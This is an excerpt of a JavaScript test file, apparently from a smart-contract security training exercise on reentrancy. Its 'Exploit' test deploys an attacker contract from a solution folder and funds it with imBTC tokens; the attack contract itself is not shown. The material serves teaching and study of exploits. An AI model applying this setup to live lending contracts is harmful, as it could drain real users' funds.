...
describe("Reentrancy Exercise 3", function () {
  ...
  it("Exploit", async () => {
    ...
    const AttackChainLendFactory = await ethers.getContractFactory(
      "contracts/reentrancy-3/solution/AttackChainLend.sol:AttackChainLend",
      attacker
    );
    this.attackChainlend = await AttackChainLendFactory.deploy(
      imBTC_ADDRESS,
      USDC_ADDRESS,
    ...
    await this.imBTC
      .connect(attacker)
      .transfer(this.attackChainlend.address, ethers.utils.parseUnits("1", 8));
